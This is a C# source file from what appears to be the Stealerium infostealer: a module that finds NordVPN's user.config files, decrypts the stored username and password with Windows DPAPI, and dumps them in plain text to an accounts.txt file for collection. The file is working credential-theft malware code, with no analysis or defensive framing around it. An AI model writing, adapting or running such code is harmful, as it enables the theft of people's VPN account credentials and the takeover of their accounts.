using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;
using Stealerium.Helpers;

namespace Stealerium.Target.VPN
{
    internal sealed class NordVpn
    {
        private static string Decode(string encodedString)
        {
            try
            {
                var decodedBytes = Convert.FromBase64String(encodedString);
                var unprotectedBytes = ProtectedData.Unprotect(decodedBytes, null, DataProtectionScope.LocalMachine);
                return Encoding.UTF8.GetString(unprotectedBytes);
            }
            catch
            {
                return string.Empty;
            }
        }

        // Save extracted NordVPN data to the specified path
        public static void Save(string savePath)
        {
            var nordVpnDir = Path.Combine(Paths.Lappdata, "NordVPN");
            var vpnDirectoryInfo = new DirectoryInfo(nordVpnDir);

            // Stop if the "NordVPN" directory does not exist
            if (!vpnDirectoryInfo.Exists)
                return;

            try
            {
                Directory.CreateDirectory(savePath);

                // Search for "user.config" in directories related to "NordVpn.exe"
                foreach (var vpnVersionDir in vpnDirectoryInfo.GetDirectories("NordVpn.exe*"))
                {
                    foreach (var configDir in vpnVersionDir.GetDirectories())
                    {
                        var userConfigPath = Path.Combine(configDir.FullName, "user.config");
                        if (!File.Exists(userConfigPath)) continue;

                        var versionSavePath = Path.Combine(savePath, configDir.Name);
                        Directory.CreateDirectory(versionSavePath);

                        var doc = new XmlDocument();
                        doc.Load(userConfigPath);

                        var encodedUsername = doc.SelectSingleNode("//setting[@name='Username']/value")?.InnerText;
                        var encodedPassword = doc.SelectSingleNode("//setting[@name='Password']/value")?.InnerText;

                        if (string.IsNullOrEmpty(encodedUsername) || string.IsNullOrEmpty(encodedPassword)) continue;

                        var username = Decode(encodedUsername);
                        var password = Decode(encodedPassword);

                        if (string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password)) continue;

                        Counter.Vpn++;
                        var accountFilePath = Path.Combine(versionSavePath, "accounts.txt");
                        var accountInfo = $"Username: {username}\nPassword: {password}\n\n";
                        File.AppendAllText(accountFilePath, accountInfo);
                    }
                }
            }
            catch (Exception error)
            {
                // Log or handle exception if needed
                Logging.Log("NordVPN >> Error saving NordVPN data:\n" + error);
            }
        }
    }
}
